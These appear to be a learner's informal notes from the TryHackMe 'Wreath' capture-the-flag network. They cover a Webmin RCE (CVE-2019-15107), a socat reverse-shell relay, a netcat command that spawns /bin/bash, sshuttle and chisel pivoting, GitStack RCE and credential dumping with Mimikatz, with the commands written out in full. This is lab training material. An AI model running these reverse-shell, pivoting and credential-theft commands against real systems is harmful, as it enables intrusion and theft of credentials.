
Here is the summary what has happened till now

Attacker IP
10.50.106.240

Public facing Server:
thomaswreath.thm
10.200.85.200 


Nmap Scan
Port 10000/tcp  snet-sensor-mgmt         RCE Vulnerabiltiy
CVE-2019-15107
```
https://thomaswreath.thm:10000/
```
Got the shell and was not able to crack the administrator hash but was crack the hash of another user but but but will use the admin hash to login via ssh


Reverse Shell Relay :
Will upload the Socat binary (i.e. the compiled version) in the victim machine so that we can set a reverse shell relay

Victim Machine
```
./socat-sardarji tcp-l:8000 tcp:10.50.106.240:4444 & socat linux binary machine port attacker IP and port ```
```
- `tcp-l:8000` is used to create the first half of the connection -- an IPv4 listener on tcp port 8000 of the target machine.
- `tcp:ATTACKING_IP:443` connects back to our local IP on port 443. The ATTACKING_IP obviously needs to be filled in correctly for this to work.
- `&` backgrounds the listener, turning it into a job so that we can still use the shell to execute other commands.

Attacker machine
```
./nc-sardarji 127.0.0.1 8000 -e/bin/bash
```


But we need SShuttle here as it uses SSH connection to create a tunnel proxt that acts like a new interface.

We are using so that we can communicate through Prod-serv and Git-serv
```
sshuttle -r root@thomaswreath.thm --ssh-cmd "ssh -i id_rsa" 10.200.105.0/24 -x 10.200.105.200
```

gitserver.thm
10.200.105.150

GitStack
RCE vulnerability for the login page 
As we are not able to login but we are able to upload a payload and can execute command in the git server as a result will try to get a reverse shell from 
git server to pro server.

We have make a user and can also rdp or evil-winrm and run Mimikatz and get the hash for the adim and cracked the password for user thomas 


Git-Server to Personal Pc
```
netsh advfirewall firewall add rule name="Chisel-Sardarji" dir=in action=allow protocol=tcp localport=47000
```

Git-serv Victim
```
./chisel_win.exe server -p 47000 --socks5
```

Attacker 
```
chisel client 10.200.101.150:47000 9090:socks
```

